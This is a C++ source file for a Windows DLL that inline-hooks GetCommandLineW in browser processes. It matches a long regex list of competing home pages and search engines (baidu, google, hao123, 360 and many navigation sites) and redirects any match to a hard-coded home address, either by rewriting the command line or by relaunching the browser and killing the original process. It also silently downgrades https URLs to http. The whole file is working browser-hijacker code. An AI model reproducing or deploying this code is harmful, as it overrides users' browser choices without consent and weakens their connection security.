#include "CMDRedirect.h"

#include "FakeCommandLine.h"

#include "pcre\pcre.h"

#include "HookControl\HookHelp.h"
#include "HookControl\InlineHook.h"
#include "HookControl\IATHook.h"

#define _W(_str)		L##_str
#define _S(_str)		_str

namespace {
#define MAX_OVECCOUNT 0x30
	const char * ptszHitRedirectURLLists[] = {
		_S("\\\\liebao\\.exe\"? +--ico\\d(?: |$)"),
		_S("\\\\qqbrowser\\.exe\"? +-sc=[^ ]+shortcut(?: |$)"),
		_S("\\\\2345explorer\\.exe\"? +--shortcut=[^ ]+(?: |$)"),
		_S("\\\\f1browser\\.exe\"? +--startup_desktopshortcut+(?: |$)"),

		_S("(?: |http[s]?://)hao\\.360\\.cn/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)www\\.duba\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)123\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)www\\.2345\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)0\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.baidu\\.com/*(?:home[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)www\\.hao123\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)[^.]*\\.hao123\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?tn=[^ ]*)?(?: |$)"),//https: cn.hao123.com/?tn=13087099_41_hao_pg

		_S("(?: |http[s]?://)www\\.google\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.google\\.com\\.hk/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)*\\.wbindex\\.cn/*.*$"),
		_S("(?: |http[s]?://)*\\.bmywm\\.com/*.*$"), // wtlcx77.bmywm.com/index.1.html

		_S("(?: |http[s]?://)*\\.58toto\\.com/*.*$"), // index.58toto.com/home?u=28378

		_S("(?: |http[s]?://)*\\.114la\\.com/*.*$"), // www.114la.com

		_S("(?: |http[s]?://).*\\.56wanyx\\.com/*.*$"), // http://index.56wanyx.com/roll?p=1f901405
		_S("(?: |http[s]?://).*\\.56wanyx\\.win/*.*$"), // http://index.56wanyx.win/roll?p=1f901405

		_S("127\.0\.0\.1:"),
		_S("localhost:"),

		_S("\\.index66\\.com"),
		_S("pc918\\.net"),
		_S("interface\\.wx-media\\.com"),
		_S("index\\.icafevip\\.com"),
		_S("17dao\\.com"),
		_S("www\\.58fy\\.com"),
		_S("daohang\\.qq\\.com"),
		_S("www\\.wblove\\.com"),
		_S("www\\.v232\\.com"),
		_S("www\\.95browser\\.com"),
		_S("www\\.6461\\.cn"),
		_S("www\\.95soo\\.com"),
		_S("www\\.go890\\.com"),
		_S("www\\.wb12318\\.com"),
		_S("jl100\\.net"),
		_S("index\\.woai310\\.com"),
		_S("1234wu\\.com"),
		_S("123\\.org\\.cn"),
		_S("123\\.19so\\.cn"),
		_S("huo99\\.com"),
		_S("sogoulp\\.com"),
		_S("www\\.52wba\\.com"),
		_S("www\\.ld56\\.com"),
		_S("www\\.wb400\\.net"),
		_S("58aq\\.com"),
		_S("g-fox\\.cn"),
		_S("uc123\\.com"),
		_S("maxthon\\.cn"),
		_S("firefoxchina\\.cn"),
		_S("opera\\.com"),
		_S("so\\.360\\.cn"),
		_S("3600\\.com"),
		_S("12318wh\\.com"),
		_S("19so\\.cn"),
		_S("917wb\\.com"),
		_S("wbindex\\.cn"),
		_S("jj123\\.com\\.cn"),
		_S("woai310\\.com"),
		_S("i8cs\\.com"),
		_S("v228\\.cn"),
		_S("58ny\\.com"),
		_S("tao123\\.com"),
		_S("soso\\.com"),
		_S("ld56\\.com"),
		_S("16116\\.net"),
		_S("wz58\\.com"),
		_S("42\\.62\\.30\\.178"), // 2345 www.2345.com/?hz
		_S("42\\.62\\.30\\.180"), // 2345 www.2345.com/?hz
		_S("index\\.icafe66\\.com")
	};

	UNICODE_STRING ustrCommandLine = { 0 };

	typedef LONG(WINAPI *PNTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

	int GetParentProcessId(DWORD dwProcessId)
	{
		LONG                      status = 0;
		DWORD                     dwParentPID = 0;
		PROCESS_BASIC_INFORMATION pbi = { 0 };

		PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle(_T("ntdll")), "NtQueryInformationProcess");

		if (!NtQueryInformationProcess)
			return -1;

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);

		if (NULL == hProcess) {
			return -1;
		}

		if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))) {
			dwParentPID = (DWORD)pbi.Reserved3;//InheritedFromUniqueProcessId
		}

		CloseHandle(hProcess);

		return dwParentPID;
	}

	bool GetProcessNameByProcessId(DWORD dwProcessID, LPWSTR pwszProcessName)
	{
		bool bIsFind = false;
		PROCESSENTRY32W pe32 = { 0 };
		HANDLE hProcessSnap = INVALID_HANDLE_VALUE;

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (!Process32FirstW(hProcessSnap, &pe32))
			return NULL;

		do
		{
			if (pe32.th32ProcessID == dwProcessID)
			{
				bIsFind = true;
				wcscpy(pwszProcessName, pe32.szExeFile);
				break;
			}

			pe32.dwSize = sizeof(PROCESSENTRY32W);
		} while (Process32NextW(hProcessSnap, &pe32));

		CloseHandle(hProcessSnap);

		return bIsFind;
	}

	bool RegRead(HKEY hRootKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, BYTE   * pBuffer, size_t sizeBufferSize)
	{
		HKEY hKey;
		bool bIsOK = false;
		DWORD dwType = 0;
		DWORD dwBufferSize = sizeBufferSize;

		if (RegOpenKeyW(hRootKey, lpSubKey, &hKey) != ERROR_SUCCESS)
			return   false;

		if (RegQueryValueExW(hKey, lpValueName, NULL, &dwType, (LPBYTE)pBuffer, &dwBufferSize) == ERROR_SUCCESS) {//   成功 
			bIsOK = true;
		}

		RegCloseKey(hKey);

		return   bIsOK;
	}

	bool IsRedirectCommandLine(const wchar_t * pcwszCheckString) {
		bool bIsHit = false;
		pcre * pcreCompile = NULL;
		int nWatchOvectors[MAX_OVECCOUNT] = { 0 };

		char * pszCheckString = Common::WSTR2STR(pcwszCheckString, NULL);

		int nErroroffset = 0;
		const char * pcszErrorptr = NULL;

		pcreCompile = pcre_compile("\"?[a-z]:\\\\[^\"]+?\\.exe\"? *$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);

		if (NULL != pcreCompile) {
			nErroroffset = pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT);
		}

		if (nErroroffset >= 0) {
			Global::Log.PrintA(LOGOutputsA, "[% 5u] Path Hit: %s", GetCurrentProcessId(), pszCheckString);
			free(pszCheckString);
			pcre_free(pcreCompile);
			return true;
		}

		for (int i = 0; i < ARR_COUNT(ptszHitRedirectURLLists); i++) {

			pcreCompile = pcre_compile(ptszHitRedirectURLLists[i], PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);

			if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {

				bIsHit = true;
				Global::Log.PrintA(LOGOutputsA, "[% 5u] Host Hit: %s", GetCurrentProcessId(), ptszHitRedirectURLLists[i]);
				break;

			}
		}

		free(pszCheckString);
		pcre_free(pcreCompile);

		return bIsHit;
	}

	bool GetUrlAssociationbyProtocol(const wchar_t * pcwszProtocolName, wchar_t * pwszProtocolCommandLine, size_t sizeBufferSize = 2048) {
		WCHAR wszOpenSubKey[MAX_PATH + 1] = { 0 };

		_swprintf(wszOpenSubKey, L"Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\%s\\UserChoice", pcwszProtocolName);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		_swprintf(wszOpenSubKey, L"Software\\Classes\\%s\\shell\\open\\command", pwszProtocolCommandLine);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		return true;
	}
}

LPWSTR WINAPI InlineGetCommandLineW(VOID)
{
	if (NULL != ustrCommandLine.Buffer) {
		//return ustrCommandLine.Buffer; // 导致QQ空间不跳转 ,360chrome 2016-03-30
	}

	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();

	if (NULL == pProcessParameters) {
		Global::Log.PrintW(LOGOutputsW, L"[% 5u] Init process parameters filed.", GetCurrentProcessId());
		return (NULL == Global::pfnGetCommandLineW) ? L"" : Global::pfnGetCommandLineW();
	}

	if (ustrCommandLine.MaximumLength < pProcessParameters->CommandLine.Length) {

		ustrCommandLine.Length = 0;
		ustrCommandLine.MaximumLength = max(pProcessParameters->CommandLine.Length, pProcessParameters->CommandLine.MaximumLength) + 1024;

		if (NULL != ustrCommandLine.Buffer) {
			HeapFree(GetProcessHeap(), 0, ustrCommandLine.Buffer);
		}

		ustrCommandLine.Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(WCHAR) * (ustrCommandLine.MaximumLength + 1));
	}

	if (NULL != ustrCommandLine.Buffer) {
		ustrCommandLine.Length = pProcessParameters->CommandLine.Length;

		ustrCommandLine.Buffer[ustrCommandLine.Length] = L'\0';
		memcpy(ustrCommandLine.Buffer, pProcessParameters->CommandLine.Buffer, pProcessParameters->CommandLine.Length * sizeof(WCHAR));
	}

	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer, _W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
	{
		if (NULL != wcsistr(ustrCommandLine.Buffer, L"qq.com/")) {
			break;
		}

		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], (wcslen(pcwszNextOffset) + 1) * sizeof(WCHAR));

		Global::Log.PrintW(LOGOutputs, L"[% 5u] Rewrite command line: %s", GetCurrentProcessId(), ustrCommandLine.Buffer);
	}

	LPCWSTR pcwszNewParameter = URL_HOMEADDR;
	LPWSTR pcwszStartCommandLine = ustrCommandLine.Buffer;
	//LPWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;

	if (IsRedirectCommandLine(pcwszStartCommandLine)) {
		LPCWSTR pcwszImageFileName = wcsrchr(pProcessParameters->ImagePathName.Buffer, L'\\');
		if (pcwszImageFileName && 0 == _wcsnicmp(pcwszImageFileName, L"\\rungame.exe", 12)) {
			Global::Log.PrintW(LOGOutputs, L"Refuse command line redirect to %s", pcwszStartCommandLine);

			return pcwszStartCommandLine;
		}

		pcwszStartCommandLine = ustrCommandLine.Buffer;
		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pProcessParameters->ImagePathName.Buffer, pcwszNewParameter);

		Global::Log.PrintW(LOGOutputs, L"[% 5u] New command line redirect to %s", GetCurrentProcessId(), pcwszStartCommandLine);
	}

	return pcwszStartCommandLine;
}

bool Hook::StartCommandLineHook()
{
	bool bIsHook = false;
	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();

	if (NULL == pProcessParameters) {
		return false;
	}

	if (true == IsRedirectWebBrowser(pProcessParameters->ImagePathName.Buffer) && NULL == Global::pfnGetCommandLineW) {
		bIsHook = HookControl::InlineHook(GetProcAddress(LoadLibrary(_T("Kernel32.dll")), "GetCommandLineW"), InlineGetCommandLineW, (void **)&Global::pfnGetCommandLineW);
	}

	Global::Log.PrintW(LOGOutputs, L"[% 5u] CMD: [%u]%s", GetCurrentProcessId(), bIsHook, pProcessParameters->CommandLine.Buffer);

#ifdef _DEBUG
	IsRedirectCommandLine(L"C:\\Users\\root\\AppData\\Local\\SogouExplorer\\SogouExplorer.exe");
	IsRedirectCommandLine(L"\"C:\\Program Files(x86)\\Google\\Chrome\\Application\\chrome.exe\" ");
#endif

	LPCWSTR pcwszNewParameter = NULL;
	LPCWSTR pcwszNewCommandLine = NULL;
	LPCWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
	LPCWSTR pcwszStartImagePathName = pProcessParameters->ImagePathName.Buffer;

	if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && 0 != wcsicmp(pcwszStartCommandLine, GetCommandLineW())) {
		pcwszNewCommandLine = GetCommandLineW();
	}
	else if (NULL != wcsistr(pcwszStartImagePathName, _W("\\liebao.exe")) && 0 != wcsicmp(pcwszStartCommandLine, GetCommandLineW())) {
		pcwszNewCommandLine = GetCommandLineW();
	}
	else if (NULL != wcsistr(pcwszStartImagePathName, _W("\\qqbrowser.exe")) && 0 != wcsicmp(pcwszStartCommandLine, GetCommandLineW())) {
		pcwszNewCommandLine = GetCommandLineW();
	}

	//////////////////////////////////////////////////////////////////////////////////////////////
	// 执行重定向

	if (NULL != pcwszNewCommandLine) {
		bool bIsSuccess = false;
		STARTUPINFOW siStratupInfo = { 0 };
		PROCESS_INFORMATION piProcessInformation = { 0 };

		siStratupInfo.cb = sizeof(STARTUPINFO);

		Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect CMD: %s", GetCurrentProcessId(), pcwszNewCommandLine);

		if (FALSE == ::CreateProcessW(NULL, (LPWSTR)pcwszNewCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
			return false;
		}

		ResumeThread(piProcessInformation.hThread);

		CloseHandle(piProcessInformation.hThread);
		CloseHandle(piProcessInformation.hProcess);

		::ExitProcess(0);
		::TerminateProcess(::GetCurrentProcess(), 0);
	}

	if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
		pcwszNewParameter = URL_HOMEADDR;
	}

	//////////////////////////////////////////////////////////////////////////////////////////////
	// 执行重定向

	if (NULL != pcwszNewParameter) {
		WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };

		_swprintf(wszProtocolCommandLine, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);

		bool bIsSuccess = false;
		STARTUPINFOW siStratupInfo = { 0 };
		PROCESS_INFORMATION piProcessInformation = { 0 };

		siStratupInfo.cb = sizeof(STARTUPINFO);

		Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect PARAM: %s", GetCurrentProcessId(), wszProtocolCommandLine);

		if (FALSE == ::CreateProcessW(NULL, wszProtocolCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
			return false;
		}

		ResumeThread(piProcessInformation.hThread);

		CloseHandle(piProcessInformation.hThread);
		CloseHandle(piProcessInformation.hProcess);

		::ExitProcess(0);
		::TerminateProcess(::GetCurrentProcess(), 0);
	}

	return true;
}
